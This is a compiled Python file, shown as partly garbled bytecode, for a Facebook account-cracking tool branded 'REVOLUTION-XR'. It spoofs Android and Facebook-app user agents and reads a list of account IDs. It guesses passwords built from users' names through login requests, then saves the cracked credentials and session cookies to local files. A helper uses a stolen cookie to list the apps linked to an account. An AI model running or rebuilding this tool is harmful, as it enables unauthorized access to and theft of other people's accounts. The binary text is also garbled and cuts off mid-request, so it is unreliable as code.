�
    {�d�  �                   �0
  � d dl Z d dlZd dl mZ d dl mZ  e j        d�  �         	 d dlZn&# e$ r  ed�  �          e j        d�  �         Y nw xY w	 d dlZ	n&# e$ r  ed�  �          e j        d�  �         Y nw xY w	 d dl
Z
n# e$ r  e j        d�  �         Y nw xY wd d	lmZmZ d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd d
lmZ d dlT d dlm Z  d dlm!Z" d dl mZ d dlm#Z# d dl Z d dlZd d
lmZ  ed��  �        j$        Z% ej&        d�  �        j'        �(                    �   �         Z)d Z*d Z+d a,g a-g a.g Z/g Z0g Z1g Z2g a3d Z4g Z5d Z*g Z6d� Z7d� Z8 ej9        g d��  �        Z:g Z; e<d�  �        D ]�Z=dZ> ej9        g d��  �        Z?d e@e:�  �        � �ZAdZB ejC        dd�  �        ZDdZE ejC        dd�  �        ZF ejC        dd �  �        ZGd!ZHe>� d"e?� d#eA� d$eB� eD� d%eE� d%eF� d%eG� d"eH� �ZIe;�J                    eI�  �         �� e<d�  �        D ]�ZKd&Z> ej9        g d��  �        Z?d'ZA ej9        g d(��  �        ZL ejC        d)d*�  �        ZM ej9        g d(��  �        ZNd+ZB ejC        dd�  �        ZDdZE ejC        dd�  �        ZF ejC        dd �  �        ZGd,ZHe>� d"e?� d#eA� eL� eM� eN� d$eB� eD� d%eE� d%eF� d%eG� d"eH� �ZOe;�J                    eO�  �         �� e<d�  �        D ]�ZKd-Z> ej9        g d��  �        Z?d.ZA ej9        g d(��  �        ZL ejC        d)d*�  �        ZM ej9        g d(��  �        ZNd/ZB ejC        dd�  �        ZDdZE ejC        dd�  �        ZF ejC        dd �  �        ZGd0ZHe>� d"e?� d#eA� eL� eM� eN� d$eB� eD� d%eE� d%eF� d%eG� d"eH� �ZOe;�J                    eO�  �         �� e<d�  �        D ]�ZKd1Z> ej9        g d��  �        Z?d2ZA ej9        g d(��  �        ZL ejC        d)d*�  �        ZM ej9        g d(��  �        ZNd3ZB ejC        dd�  �        ZDdZE ejC        dd�  �        ZF ejC        dd �  �        ZGd4ZHe>� d"e?� d#eA� eL� eM� eN� d$eB� eD� d%eE� d%eF� d%eG� d"eH� �ZOe;�J                    eO�  �         ��ejP        �Q                    d5�  �         d6ZRd7ZSd8ZTd9ZUd:ZVd;d<d=d>�ZWd?ZXd@� ZYdA� ZZdB� Z[dC� Z\dD� Z]dE� Z^ G dF� dG�  �        Z_ e\�   �          dS )H�    N)�system�clearz
  installing Requests ...
zpip install requestsz
  installing futures ...
zpip install futuresz!pip install mechanize > /dev/null)�Request�urlopen)�ThreadPoolExecutor)�*)�randint)�sleep)�
decompress�   ��max_workersz�https://gist.githubusercontent.com/Nox-Naved/0588acb2b77932048a251d50a973029b/raw/f6de01ac684131b5353854ee114880fb00227cee/Model60c                  ��  � t          t          j        dd�  �        �  �        dz   t          t          j        dd�  �        �  �        z   dz   t          t          j        dd�  �        �  �        z   } t          j        d	d
�  �        }d}dt          j        dd�  �        � dt          j        t          �  �        � dt          j        dd�  �        � dt          j        dd�  �        � d�	|z   }|S )N�d   i�  z.0.0.�   �   �.�(   �   i�pi�d�z�[FBAN/FB4A;FBAV/374.0.0.20.109;FBBV/381462200;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.katana;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]z Dalvik/2.1.0 (Linux; U; Android �   �   �; z Build/QP1A.i� i?B �o   ��  �) )�str�randomr	   �choice�model2)�vchrome�VAPP�END�uas       �MRX.py�randBuildLSBr%   <   s(  � ��&�.��S�)�)�*�*�7�2�3�v�~�a��7J�7J�3K�3K�K�C�O�PS�TZ�Tb�ce�fi�Tj�Tj�Pk�Pk�k�G��>�)�I�.�.�D� g�C� 
c�F�N�1�R�,@�,@�  
c�  
c�F�M�RX�DY�DY�  
c�  
c�gm�gu�v|�  ~D�  hE�  hE�  
c�  
c�  HN�  HV�  WZ�  [^�  H_�  H_�  
c�  
c�  
c�  dg�  
g�B��I�    c                  �<   � d} t          j        g d��  �        | z   }|S )Nzy[FBAN/EMA;FBBV/352223683;FBAV/291.0.0.12.110;FBDV/SM-G935FD;FBLC/en_GB;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=1.0125}])dzADalvik/2.1.0 (Linux; U; Android 12; ELZ-AN20 Build/HONORELZ-AN20)zODalvik/2.1.0 (Linux; U; Android 13; motorola edge 20 pro Build/T1RA33.55-15-10)z@Dalvik/2.1.0 (Linux; U; Android 6.0.1; ASUS_Z012DA Build/MMB29P)zEDalvik/2.1.0 (Linux; U; Android 11; BQru-6868L Build/RP1A.201005.001)zIDalvik/2.1.0 (Linux; U; Android 12; TAB_912_PRO_4G Build/SP1A.210812.016)zEDalvik/2.1.0 (Linux; U; Android 11; 22031116AI Build/RP1A.200720.011)zDDalvik/2.1.0 (Linux; U; Android 10; O2 TV Box Build/QTT2.200720.001)zIDalvik/2.1.0 (Linux; U; Android 9; motorola one vision Build/PSA29.97-37)z?Dalvik/2.1.0 (Linux; U; Android 9; AFTANNA0 Build/PMAIN1.2992N)zCDalvik/2.1.0 (Linux; U; Android 13; M2101K6P Build/TKQ1.221013.002)zFDalvik/2.1.0 (Linux; U; Android 13; V2127 Build/TP1A.220624.014_NONFC)zBDalvik/2.1.0 (Linux; U; Android 11; octopus Build/R112-15359.58.0)zEDalvik/2.1.0 (Linux; U; Android 13; 23021RAAEG Build/TKQ1.221114.001)zFDalvik/2.1.0 (Linux; U; Android 13; SM-G950F Build/TQ2A.230405.003.E1)zDDalvik/2.1.0 (Linux; U; Android 12; 100071485 Build/SP1A.210812.016)zBDalvik/2.1.0 (Linux; U; Android 9; SM-A505N Build/PPR1.180610.011)zDDalvik/2.1.0 (Linux; U; Android 10.0; YT7260L Build/PPR1.180610.011)z@Dalvik/2.1.0 (Linux; U; Android 8.1.0; Gtel X7plus Build/O11019)z<Dalvik/1.6.0 (Linux; U; Android 4.4.4; TPS550A Build/KTU84Q)zNDalvik/2.1.0 (Linux; U; Android 10; TC57 Build/10-16-10.00-QG-U133-STD-HEL-04)zBDalvik/2.1.0 (Linux; U; Android 13; CPH2271 Build/TP1A.220905.001)z<Dalvik/2.1.0 (Linux; U; Android 8.1.0; iris60c Build/O11019)z=Dalvik/2.1.0 (Linux; U; Android 5.1.1; GT-S7580 Build/LMY48Y)z?Dalvik/2.1.0 (Linux; U; Android 7.0; SPYBOXSXMINI Build/NRD90M)z?Dalvik/2.1.0 (Linux; U; Android 11; K55g Build/RP1A.201005.001)z@Dalvik/2.1.0 (Linux; U; Android 12; V2065 Build/SP1A.210812.003)z?Dalvik/2.1.0 (Linux; U; Android 11; E506 Build/RP1A.201005.001)z@Dalvik/2.1.0 (Linux; U; Android 11; BNE-LX3 Build/HUAWEIBNE-LX3)z9Dalvik/2.1.0 (Linux; U; Android 9; APEXA-A-1500 Build/PI)zADalvik/2.1.0 (Linux; U; Android 9; DL3Plus Build/PPR1.180610.011)z?Dalvik/2.1.0 (Linux; U; Android 11; E7110 Build/4.501VZ.0568.a)zBDalvik/2.1.0 (Linux; U; Android 9; VISIO TV Build/PTO7.210711.001)z?Dalvik/2.1.0 (Linux; U; Android 9.0; PHILCO_ATV11 Build/NHG47L)zGDalvik/2.1.0 (Linux; U; Android 13; Redmi Note 8 Build/TQ1A.230205.002)z?Dalvik/2.1.0 (Linux; U; Android 12; RBN-NX1 Build/HONORRBN-N31)zMDalvik/2.1.0 (Linux; U; Android 10; motorola one action Build/QSB30.62-17-17)z:Dalvik/2.1.0 (Linux; U; Android 5.1; YU 6000 Build/LMY47D)zEDalvik/2.1.0 (Linux; U; Android 13; 23028RA60L Build/TKQ1.221114.001)z�Dalvik/2.1.0 (Linux; U; Android 10; Note 7T Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36zCDalvik/2.1.0 (Linux; U; Android 13; SM-G9880 Build/TP1A.220624.014)z@Dalvik/2.1.0 (Linux; U; Android 11; T10W2 Build/RP1A.201105.002)zCDalvik/2.1.0 (Linux; U; Android 13; SM-A346M Build/TP1A.220624.014)zCDalvik/2.1.0 (Linux; U; Android 11; CORN X55 Build/RP1A.201005.001)z=Dalvik/2.1.0 (Linux; U; Android 5.1.1; PO-10034 Build/LMY47V)zDDalvik/2.1.0 (Linux; U; Android 11; 2209116AG Build/RKQ1.200826.002)z=Dalvik/2.1.0 (Linux; U; Android 7.1.2; DroidBox Build/NHG47L)zHDalvik/2.1.0 (Linux; U; Android 9; moto e(6) plus Build/PTAS29.401-25-3)zADalvik/2.1.0 (Linux; U; Android 11; Motorola Defy Build/RZD31.31)zBDalvik/2.1.0 (Linux; U; Android 10; HEYOU20 Build/QKQ1.191008.001)z>Dalvik/2.1.0 (Linux; U; Android 11; U55 Build/RP1A.200720.011)zFDalvik/2.1.0 (Linux; U; Android 8.1.0; px30_evb Build/OPM8.190505.001)zODalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-60-3-1)zEDalvik/2.1.0 (Linux; U; Android 12; moto g72 Build/S3SVS32.45-28-2-2)zMDalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-60-1)z7Dalvik/2.1.0 (Linux; U; Android 12; A003SH Build/S2010)z?Dalvik/2.1.0 (Linux; U; Android 9; VOG-L04 Build/HUAWEIVOG-L04)zQDalvik/2.1.0 (Linux; U; Android 10; motorola one 5G ace Build/QZKS30.Q4-40-64-14)z@Dalvik/2.1.0 (Linux; U; Android 11; JAD-LX9 Build/HUAWEIJAD-L09)zCDalvik/2.1.0 (Linux; U; Android 12; V2202 Build/SP1A.210812.003_SC)z@Dalvik/2.1.0 (Linux; U; Android 10.1; T99 Build/QP1A.191105.004)zQDalvik/2.1.0 (Linux; U; Android 11; Grundig Android UHD TV Build/RTM3.211215.227)zGDalvik/2.1.0 (Linux; U; Android 11; Redmi Note 9 Build/RQ2A.210505.003)zBDalvik/2.1.0 (Linux; U; Android 11; Black G Build/RP1A.200720.011)z>Dalvik/2.1.0 (Linux; U; Android 10; K6b Build/QP1A.190711.020)z8Dalvik/2.1.0 (Linux; U; Android 6.0; 4049G Build/MRA58K)z=Dalvik/2.1.0 (Linux; U; Android 7.1; GOLDTVPlus Build/NRD91N)z?Dalvik/2.1.0 (Linux; U; Android 12; RKY-LX3 Build/HONORRKY-L33)z9Dalvik/2.1.0 (Linux; U; Android 8.1.0; G706 Build/O11019)z9Dalvik/2.1.0 (Linux; U; Android 5.1; TIS001 Build/LMY47I)z>Dalvik/2.1.0 (Linux; U; Android 11; C60 Build/RP1A.201005.001)z;Dalvik/2.1.0 (Linux; U; Android 10.0; B9212BF Build/O11019)z9Dalvik/2.1.0 (Linux; U; Android 6.0; W NEXT Build/MRA58K)zGDalvik/2.1.0 (Linux; U; Android 9; Bmobile AX754 Build/PPR1.180610.011)z<Dalvik/2.1.0 (Linux; U; Android 8.1.0; TIS_001 Build/O11019)z:Dalvik/2.1.0 (Linux; U; Android 8.1.0; WS5SE Build/O11019)z?Dalvik/2.1.0 (Linux; U; Android 12; RKY-LX3 Build/HONORRKY-L03)z@Dalvik/2.1.0 (Linux; U; Android 12; T776O Build/SP1A.210812.016)z;Dalvik/2.1.0 (Linux; U; Android 8.1.0; SGINO6 Build/O11019)zADalvik/2.1.0 (Linux; U; Android 13; KB2007 Build/RKQ1.211119.001)z@Dalvik/2.1.0 (Linux; U; Android 11; ABR-LX9 Build/HUAWEIABR-L09)z@Dalvik/2.1.0 (Linux; U; Android 11; NCO-LX3 Build/HUAWEINCO-LX3)zJDalvik/2.1.0 (Linux; U; Android 12; moto g51 5G Build/S2RYAS32.58-13-12-4)z9Dalvik/2.1.0 (Linux; U; Android 13; SH-RM19s Build/S3067)zCDalvik/2.1.0 (Linux; U; Android 13; SM-A047M Build/TP1A.220624.014)zBDalvik/2.1.0 (Linux; U; Android 12; Black_Z Build/SP1A.210812.016)zEDalvik/2.1.0 (Linux; U; Android 12; 22120RN86G Build/SP1A.210812.016)z>Dalvik/2.1.0 (Linux; U; Android 11; S10 Build/RP1A.201005.006)z@Dalvik/2.1.0 (Linux; U; Android 11; DS502 Build/RP1A.200720.011)zBDalvik/2.1.0 (Linux; U; Android 13; CPH2365 Build/TP1A.220905.001)zCDalvik/2.1.0 (Linux; U; Android 13; SM-A135N Build/TP1A.220624.014)z@Dalvik/2.1.0 (Linux; U; Android 13; I2207 Build/TP1A.220624.014)z8Dalvik/2.1.0 (Linux; U; Android 5.0; W55SE Build/LRX21M)z>Dalvik/2.1.0 (Linux; U; Android 11; K58 Build/RP1A.201005.001)zGDalvik/2.1.0 (Linux; U; Android 12; moto g(60) Build/S2RIS32.32-20-9-7)z8Dalvik/1.6.0 (Linux; U; Android 4.4.2; GOA Build/KOT49H)zGDalvik/2.1.0 (Linux; U; Android 10; Platinum_B4P Build/QP1A.190711.020)zADalvik/2.1.0 (Linux; U; Android 12; VNE-LX3 Build/HONORVNE-L33CM)z>Dalvik/2.1.0 (Linux; U; Android 11; G60 Build/RP1A.201005.001)zKDalvik/2.1.0 (Linux; U; Android 9; moto g(8) power lite Build/POD29.348-25)z8Dalvik/2.1.0 (Linux; U; Android 6.0; T6001 Build/MRA58K))r   r   )r"   r#   s     r$   �randBuildvsskjr(   C   sI   � � F�C�	��  ll�  ll�  ll�  
ml�  
ml�  nlql�  
ql�B��Ir&   (}  zGT-1015zGT-1020zGT-1030zGT-1035zGT-1040zGT-1045zGT-1050zGT-1240zGT-1440zGT-1450zGT-18190zGT-18262z	GT-19060IzGT-19082zGT-19083zGT-19105zGT-19152zGT-19192zGT-19300zGT-19505zGT-2000zGT-20000zGT-200szGT-3000z	GT-414XOPzGT-6918zGT-7010zGT-7020zGT-7030zGT-7040zGT-7050zGT-7100zGT-7105zGT-7110zGT-7205zGT-7210zGT-7240RzGT-7245zGT-7303zGT-7310zGT-7320zGT-7325zGT-7326zGT-7340zGT-7405zGT-7550   5GT-8005zGT-8010zGT-81zGT-810zGT-8105zGT-8110zGT-8220SzGT-8410zGT-9300zGT-9320zGT-93GzGT-A7100zGT-A9500z
GT-ANDROIDzGT-B2710zGT-B5330z	GT-B5330Bz	GT-B5330LzGT-B5330ZKAINUzGT-B5510zGT-B5512zGT-B5722zGT-B7510zGT-B7722zGT-B7810zGT-B9150zGT-B9388zGT-C3010zGT-C3262z	GT-C3310RzGT-C3312z	GT-C3312Rz	GT-C3313TzGT-C3322z	GT-C3322izGT-C3520z	GT-C3520IzGT-C3592zGT-C3595zGT-C3782zGT-C6712z	GT-E1282TzGT-E1500zGT-E2200zGT-E2202zGT-E2250zGT-E2252zGT-E2600z	GT-E2652WzGT-E3210zGT-E3309z	GT-E3309Iz	GT-E3309TzGT-G530HzGT-g900fzGT-G930FzGT-H9500zGT-I5508zGT-I5801zGT-I6410zGT-I8150zGT-I8160OKLTPAzGT-I8160ZWLTTTzGT-I8258z	GT-I8262DzGT-I8268zGT-I8505zGT-I8530BAABTUzGT-I8530BALCHOzGT-I8530BALTTTz	GT-I8550EzGT-i8700zGT-I8750zGT-I900z	GT-I9008LzGT-i9040z	GT-I9080Ez	GT-I9082CzGT-I9082EWAINUz	GT-I9082iz	GT-I9100GzGT-I9100LKLCHTz	GT-I9100Mz	GT-I9100Pz	GT-I9100TzGT-I9105UANDBTz	GT-I9128Ez	GT-I9128Iz	GT-I9128Vz	GT-I9158Pz	GT-I9158Vz	GT-I9168Iz	GT-I9192Iz	GT-I9195Hz	GT-I9195LzGT-I9250z	GT-I9303Iz	GT-I9305Nz	GT-I9308Iz	GT-I9505Gz	GT-I9505Xz	GT-I9507VzGT-I9600zGT-m190zGT-M5650zGT-miniz	GT-N5000SzGT-N5100zGT-N5105zGT-N5110zGT-N5120z	GT-N7000BzGT-N7005z	GT-N7100TzGT-N7102zGT-N7105z	GT-N7105TzGT-N7108z	GT-N7108DzGT-N8000zGT-N8005zGT-N8010zGT-N8020zGT-N9000zGT-N9505zGT-P1000CWAXSAz	GT-P1000Mz	GT-P1000TzGT-P1010z	GT-P3100BzGT-P3105zGT-P3108zGT-P3110zGT-P5100zGT-P5200zGT-P5210XD1zGT-P5220zGT-P6200z	GT-P6200LzGT-P6201zGT-P6210zGT-P6211zGT-P6800zGT-P7100zGT-P7300z	GT-P7300BzGT-P7310zGT-P7320z	GT-P7500Dz	GT-P7500Mz	GT-P7500Rz	GT-P7500VzGT-P7501zGT-P7511zGT-S3330zGT-S3332zGT-S3333zGT-S3370zGT-S3518zGT-S3570z	GT-S3600izGT-S3650z	GT-S3653Wz	GT-S3770Kz	GT-S3770Mz	GT-S3800WzGT-S3802zGT-S3850zGT-S5220z	GT-S5220RzGT-S5222zGT-S5230z	GT-S5230Wz	GT-S5233Tz	GT-s5233wzGT-S5250zGT-S5253zGT-s5260zGT-S5280zGT-S5282z	GT-S5283BzGT-S5292zGT-S5300z	GT-S5300LzGT-S5301z	GT-S5301Bz	GT-S5301LzGT-S5302z	GT-S5302BzGT-S5303z	GT-S5303BzGT-S5310z	GT-S5310Bz	GT-S5310Cz	GT-S5310Ez	GT-S5310Gz	GT-S5310Iz	GT-S5310Lz	GT-S5310Mz	GT-S5310NzGT-S5312z	GT-S5312Bz	GT-S5312Cz	GT-S5312LzGT-S5330zGT-S5360z	GT-S5360Bz	GT-S5360Lz	GT-S5360TzGT-S5363zGT-S5367zGT-S5369zGT-S5380z	GT-S5380DzGT-S5500zGT-S5560z	GT-S5560iz	GT-S5570Bz	GT-S5570Iz	GT-S5570LzGT-S5578zGT-S5600zGT-S5603zGT-S5610z	GT-S5610KzGT-S5611zGT-S5620zGT-S5670z	GT-S5670BzGT-S5670HKBZTAzGT-S5690z	GT-S5690RzGT-S5830z	GT-S5830Dz	GT-S5830Gz	GT-S5830iz	GT-S5830Lz	GT-S5830Mz	GT-S5830Tz	GT-S5830Vz	GT-S5831izGT-S5838z	GT-S5839izGT-S6010zGT-S6010BBABTUzGT-S6012z	GT-S6012BzGT-S6102z	GT-S6102Bz	GT-S6293Tz	GT-S6310BzGT-S6310ZWAMIDzGT-S6312z	GT-S6313TzGT-S6352zGT-S6500z	GT-S6500Dz	GT-S6500LzGT-S6790z	GT-S6790Lz	GT-S6790Nz	GT-S6792LzGT-S6800zGT-S6800HKAXFAzGT-S6802zGT-S6810z	GT-S6810Bz	GT-S6810Ez	GT-S6810Lz	GT-S6810MzGT-S6810MBASERz	GT-S6810PzGT-S6812z	GT-S6812Bz	GT-S6812Cz	GT-S6812izGT-S6818z	GT-S6818Vz	GT-S7230Ez	GT-S7233Ez	GT-S7250DzGT-S7262zGT-S7270z	GT-S7270LzGT-S7272z	GT-S7272Cz	GT-S7273TzGT-S7278z	GT-S7278UzGT-S7390z	GT-S7390Gz	GT-S7390LzGT-S7392z	GT-S7392LzGT-S7500zGT-S7500ABABTUzGT-S7500ABADBTzGT-S7500ABTTLPzGT-S7500CWADBTz	GT-S7500Lz	GT-S7500TzGT-S7560z	GT-S7560MzGT-S7562z	GT-S7562Cz	GT-S7562iz	GT-S7562LzGT-S7566zGT-S7568z	GT-S7568IzGT-S7572z	GT-S7580Ez	GT-S7583TzGT-S758XzGT-S7592zGT-S7710z	GT-S7710LzGT-S7898z	GT-S7898IzGT-S8500zGT-S8530zGT-S8600z	GT-STB919zGT-T140zGT-T150zGT-V8azGT-V8izGT-VC818z	GT-VM919SzGT-W131zGT-W153zGT-X831zGT-X853zGT-X870zGT-X890zGT-Y8750i'  zGMozilla/5.0 (Linux; Android 11; Nokia 1 Plus Build/RP1A.200720.011; wv))�6�7�8�9�10�11�12z TL-tl; zGAppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79�I   r   �0ih  i$  r   r   z=Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/319.0.0.7.107;]� r   r   r   zBDalvik/2.1.0 (Linux; U; Android 9; SM-G955F Build/PPR1.180610.011)zAndroid 9; SM-G955F Build/)�A�B�C�D�E�F�G�H�I�J�K�L�M�N�O�P�Q�R�S�T�U�V�W�X�Y�Zr   r   zGAppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79z>Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/297.0.0.13.113;]z5Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X)zCPU iPhone OS 8_0 like Mac OS Xz(AppleWebKit/605.1.15 (KHTML, like Gecko)zlMobile/12A365 [FBAN/FBIOS;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/8.0;FBSS/3;FBID/phone;FBLC/cs_CZ;FBOP/5]z>Dalvik/2.1.0 (Linux;U;Android 8;Pixel 4a Build/QQ2A.200501.001z(Android 8;Pixel 4a Build/QQ2A.200501.001zHAppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129z=Mobile Safari/537.36[FBAN/EMA;FBLC/ta_IN;FBAV/331.0.0.9.105;]z	]2; RXRz[1;37mz[38;5;208mz
[38;5;46mz
[38;5;48mz[1;31mzadsmanager.facebook.comz("Chromium";v="107", "Not=A?Brand";v="24"�980)�Host�	sec-ch-ua�viewport-widthu{     [1;32m  

              88""Yb Yb  dP 88""Yb 
              88__dP  YbdP  88__dP 
              88"Yb   dPYb  88"Yb  
              88  Yb dP  Yb 88  Yb 
                                     
              [1;36m[1;37m==[32m[1;34m[ REVOLUTION-XR ][1;37m==
[1;32m═══════════════════════════════════════════════════════
[1;31m[[1;37m><[1;31m]  [1;37mFACEBOOK [1;33m : [1;37m Rxr Turag
[1;31m[[1;37m><[1;31m]  [1;37mGITHUB [1;33m   : [1;37m REVOLUTION-XR
[1;31m[[1;37m><[1;31m]  [1;37mSTATUS [1;33m   : [1;33m TRAIL 
[1;31m[[1;37m><[1;31m]  [1;37mVERSION [1;33m  : [1;36m 1.0 
[1;32m═══════════════════════════════════════════════════════
c                  �$   � t          d�  �         d S )Nu�   [1;33m──────────────────────────────────────────────────────)�print� r&   r$   �linerT   �   s)   � ��  v�  w�  w�  w�  w�  wr&   c                  �V   � t          j        d�  �         t          t          �  �         d S )Nr   )�osr   rR   �logorS   r&   r$   r   r   �   s!   � ��I�g����	�$�K�K�K�K�Kr&   c                 ��  � t          | �  �        dk    st          |�  �        dk    r�t          d�  �         t          d�  �         t          d�  �         t          dt          t          t          �  �        �  �        z  �  �         t          dt          t          |�  �        �  �        z  �  �         t          d�  �         t	          d�  �         t          �   �          d S d S )Nr   �
z/-----------------------------------------------z! THE PROCESS HAS BEEN COMPLETE...z TOTAL OK: %sz TOTAL CP: %szPRESS ENTER TO BACK MENU )�lenrR   r   �oks�input�exit)�OKs�cpss     r$   �resultr`   �   s�   � �
�3�x�x�1�}�}��C���A����d�����f�����1�2�2�2��o��C��H�H���-�.�.�.��o��C��H�H���-�.�.�.��f�����)�*�*�*������� &�r&   c                  �  � t          �   �          t          d�  �         t          �   �          t          d�  �        } | dk    rt	          �   �          d S | dk    rt          �   �          d S | dk    rt          �   �          d S | dk    rt          �   �          d S t          d�  �         t          j        d�  �         t          �   �          d S )	Nz[1] FILE CRACK
[0] EXIT MENUz)[1;31m[[1;32m*[1;31m][1;32m SELECT : �1�2�3�4z-
 Invalid choice please select correct optionr   )
r   rR   rT   r\   �method_crack�rnd�gmail�timer
   �main)�xs    r$   rj   rj   �   s�   � ������&�'�'�'������	@�A�A����G�G��.�.�.�.�.���f�f�S�U�U�U�U�U���f�f�U�W�W�W�W�W���f�f�U�W�W�W�W�W��<�=�=�=�d�j��m�m�m�D�F�F�F�F�Fr&   c                  �&  � t          �   �          t          dd� ��  �         t          dd� ��  �         t          dd� ��  �         t          d�  �         t          d�  �         t          d	�  �        } | d
k    rBt          �                    d�  �         t          �   �         �                    t          �  �         d S | dk    rBt          �                    d�  �         t          �   �         �                    t          �  �         d S | dk    rBt          �                    d�  �         t          �   �         �                    t          �  �         d S | dk    rt          �   �          d S t          d�  �         t          j
        d�  �         t          �   �          d S )Nz[1] Method r   z[2] Method �   z[3] Method �   z[0] Back� u+   [1;31m[[1;32m✓[1;31m][1;32m CHOOSE : rb   �methodArc   �methodBrd   �methodCr1   z
 Select Valid Option ...)r   rR   r\   �methods�append�
main_crack�crack�id�flameri   r
   rf   )�options    r$   rf   rf   �   sc  � �	�G�G�G�	�
��
�
����	�
��
�
����	�
��
�
����	�+����	�"�I�I�I��L�M�M�F���|�|����y�!�!�!������2������	�#������y�!�!�!������2������	�#������y�!�!�!������2������ 
�#����������(�)�)�)�
�j��m�m�m��n�n�n�n�nr&   c                 ��  � t          j        �   �         }|�                    ddd| z   i��  �        j        }t          �                    |d�  �        }|�                    dd��  �        }d	� |�                    d
�  �        D �   �         }	 t          t          |�  �        �  �        D ]=}t          dt          �dt          �||         �                    dd�  �        ���  �         �>n'# t          $ r t          dt          z  �  �         Y nw xY w|�                    ddd| z   i��  �        j        }t          �                    |d�  �        }|�                    dd��  �        }d� |�                    d
�  �        D �   �         }	 t          t          |�  �        �  �        D ]6}t          dt          �d||         �                    dd�  �        ���  �         �7d S # t          $ r t          dt          z  �  �         Y d S w xY w)Nz<https://mbasic.facebook.com/settings/apps/tabbed/?tab=active�cookieznoscript=1;)�cookieszhtml.parser�form�post)�methodc                 �   � g | ]	}|j         ��
S rS   ��text��.0�is     r$   �
<listcomp>zcek_apk.<locals>.<listcomp>�   �   � �*�*�*�A���*�*�*r&   �h3�\u     [0m              ➛ zAdded toz	 Added toz\    %s[0m cookie invalidz>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactivec                 �   � g | ]	}|j         ��
S rS   r�   r�   s     r$   r�   zcek_apk.<locals>.<listcomp>�   r�   r&   �Expiredz Expiredz\    %s [0mcookie invalid)�requests�Session�getr�   �bs4�BeautifulSoup�find�find_all�rangerZ   rR   rB   r:   �replace�AttributeErrorr?   )�ckkk�session�w�soprk   �gamer�   s          r$   �cek_apkr�   �   s  � ������
�;�;�M�W_�`m�nr�`r�Vs�;�t�t�y��
����=�)�)���X�X�f�F�X�#�#��*�*����D�)�)�*�*�*��-���T����� ]� ]�a��5�q�q�q���4��7�?�?�:�k�3Z�3Z�3Z�
[�\�\�\�\�]��� -� -� -��	'��	+�,�,�,�,�,�-����
�;�;�O�Ya�bo�pt�bt�Xu�;�v�v�{��
����=�)�)���X�X�f�F�X�#�#��*�*����D�)�)�*�*�*��-���T����� W� W�a��5�Q�Q�Q�t�A�w���y��/T�/T�/T�
U�V�V�V�V�W� W��� -� -� -��	'��	+�,�,�,�,�,�,�-���s&   �AC" �"!D�D�<AG �!G6�5G6c                   �8   � e Zd Zd� Zd� Zd� Zd� Zd� Zd� Zd� Z	dS )	ru   c                 �   � g | _         d S )N)rw   )�selfs    r$   �__init__zmain_crack.__init__�   s   � �����r&   c                 �.  � t          �   �          t          d�  �        | _        	 t          | j        �  �        �                    �   �         �                    �   �         | _        | �                    �   �          d S # t          $ r� t          d�  �         t          j        d�  �         t          j        d�  �         t          t          �  �         t          d�  �         t          j        d�  �         t          �   �         �                    |�  �         Y d S w xY w)Nu.   [1;31m[[1;32m✓[1;31m][1;32m NPUT FILE : zOpps File Not Found ...rm   r   zTry Again ...)r   r\   �file�open�read�
splitlinesrw   �pasw�FileNotFoundErrorrR   ri   r
   rV   r   rW   ru   rv   )r�   rw   s     r$   rv   zmain_crack.crack�   s�   � ������V�W�W��	�
	#��4�9�o�o�*�*�,�,�7�7�9�9�D�G��I�I�K�K�K�K�K�� � 	#� 	#� 	#��+�,�,�,��J�q�M�M�M��I�g�����$�K�K�K��/�"�"�"��J�q�M�M�M��L�L���r�"�"�"�"�"�"�	#���s   �AA7 �7BD�Dc                 �4
  � 	 t           j        �                    dt          � dt          � dt          t          �  �        � dt          t          �  �        � dt          � d�                    t          t          t          | j
        �  �        �  �        z  �  �        � t          � ��  �         t           j        �                    �   �          |�                    d�  �        d         }	 |�                    d�  �        d         }n	#  |}Y nxY w|D �]�}|�                    d|�                    �   �         �  �        �                    d	|�  �        �                    d
|�                    �   �         �  �        �                    d|�  �        �                    d|�  �        �                    d|�                    �   �         �  �        }t          j        �   �         5 }d}	i dt#          t%          j        �   �         �  �        �dd�dt#          t%          j        �   �         �  �        �dd�dt#          t%          j        �   �         �  �        �dd�dd�dd�d|�d|�dd�d d!�d"d#�d$t#          t%          j        �   �         �  �        �d%d&�d'd(�d)d*�d+d,d-d.d/��}
d d d �  �         n# 1 swxY w Y   |	d0d1t#          t)          j        d2d3�  �        �  �        t#          t)          j        d2d3�  �        �  �        d4d5d6d7d8d9d:d;d;d<d=�}|�                    d>|
|d?�@�  �        �                    �   �         }dA|v �r@dB�                    dC� |dD         D �   �         �  �        }t3          j        t7          j        dE�  �        �  �        �                    �   �         �                    dFd#�  �        �                    dGdH�  �        �                    dIdJ�  �        }dK|� dB|� �}t=          dLt>          � dM|� d|� dt          � ��  �         t          �                     |�  �         tC          dNdO�  �        �                    |dPz   |z   dQz   �  �         tC          dRdO�  �        �                    |dPz   |z   dPz   |z   dQz   �  �          ndS|dT         dU         v rmt=          dLtD          � dV|� d|� dt          � ��  �         t          �                     |�  �         tC          dWdO�  �        �                    |dPz   |z   dQz   �  �         ��Ӑ��t          dz  ad S # t          j#        j$        $ r | �%                    |||�  �         Y d S w xY w)XN� z[-1] � | �{:.0%}r2   r   r   �first�First�last�Last�Name�namea&  Dalvik/2.1.0 